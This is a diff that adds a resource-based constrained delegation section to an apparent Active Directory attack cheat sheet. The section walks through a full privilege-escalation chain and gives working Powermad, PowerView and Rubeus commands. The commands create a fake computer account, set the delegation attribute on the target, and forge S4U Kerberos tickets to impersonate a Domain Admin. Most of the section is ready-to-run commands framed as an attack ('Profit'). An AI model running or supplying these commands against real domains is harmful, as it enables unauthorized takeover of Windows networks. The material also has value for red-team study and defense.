@@ -282,3 +282,71 @@ $idToImpersonate.Impersonate()
 ls \\dc01.offense.local\c$
 ```
 
+
+## Resource-based constrained delegation
+- It's possible to gain code execution with elevated privileges on a remote computer if you have WRITE privilege on that computer's AD object.
+
+- must be Windows 2012 Domain Controller or later
+
+### Example steps
+- We have code execution on the box `WS02` in the context of `offense\Service1` user;
+- User `Service1` has WRITE privilege over a target computer `WS01`;
+- User `Service1` creates a new computer object `FAKE01` in Active Directory (no admin required);
+- User `Service1` leverages the WRITE privilege on the `WS01` computer object and updates its object's attribute `msDS-AllowedToActOnBehalfOfOtherIdentity` to enable the newly created computer `FAKE01` to impersonate and authenticate any domain user that can then access the target system `WS01`. In human terms this means that the target computer `WS01` is happy for the computer `FAKE01` to impersonate any domain user and give them any access (even Domain Admin privileges) to `WS01`;
+- WS01 trusts FAKE01 due to the modified msDS-AllowedToActOnBehalfOfOtherIdentity;
+- We request Kerberos tickets for `FAKE01$` with ability to impersonate `offense\administrator` who is a Domain Admin;
+- Profit - we can now access the c$ share of ws01 from the computer `ws02`.
+
+### Requirements
+
+
+### Enumration 
+
+```shell
+# check ms-ds-machineaccountquota
+Get-DomainObject -Identity "dc=offense,dc=local" -Domain offense.local
+
+# check DC version
+Get-DomainController
+
+# check object must not have the attribute msds-allowedtoactonbehalfofotheridentity 
+Get-NetComputer ws01 | Select-Object -Property name, msds-allowedtoactonbehalfofotheridentity
+```
+
+### Attack
+**Creating a Computer Object**
+```shell
+import-module powermad
+New-MachineAccount -MachineAccount FAKE01 -Password $(ConvertTo-SecureString '123456' -AsPlainText -Force) -Verbose
+
+# Check if created
+Get-DomainComputer SERVICEA
+```
+**Resource-based Constrained Delegation**
+```shell
+# activedirectory PowerShell module
+$targetComputer = 'WS01'
+Set-ADComputer $targetComputer -PrincipalsAllowedToDelegateToAccount FAKE01$ #Assing delegation privileges
+Get-ADComputer $targetComputer -Properties PrincipalsAllowedToDelegateToAccount #Check that it worked
+
+# powerview
+ComputerSid = Get-DomainComputer FAKE01 -Properties objectsid | Select -Expand objectsid
+$SD = New-Object Security.AccessControl.RawSecurityDescriptor -ArgumentList "O:BAD:(A;;CCDCLCSWRPWPDTLOCRSDRCWDWO;;;$ComputerSid)"
+$SDBytes = New-Object byte[] ($SD.BinaryLength)
+$SD.GetBinaryForm($SDBytes, 0)
+Get-DomainComputer $targetComputer | Set-DomainObject -Set @{'msds-allowedtoactonbehalfofotheridentity'=$SDBytes}
+
+#Check that it worked
+Get-DomainComputer $targetComputer -Properties 'msds-allowedtoactonbehalfofotheridentity'
+```
+
+**Execution**
+```sehll
+# Generating RC4,AES Hash 
+.\Rubeus.exe hash /password:123456 /user:fake01 /domain:offense.local
+
+# Impersonation
+./rubeus.exe s4u /user:fake01$ /aes256:<aes256 hash> /aes128:<aes128 hash> /rc4:<rc4 hash>  /impersonateuser:administrator /msdsspn:cifs/victim.offense.local /ptt
+
+./rubeus.exe s4u /user:fake01$ /aes256:<AES 256 hash> /impersonateuser:administrator /msdsspn:cifs/victim.domain.local /altservice:krbtgt,cifs,host,http,winrm,RPCSS,wsman,ldap /domain:domain.local /ptt
+```
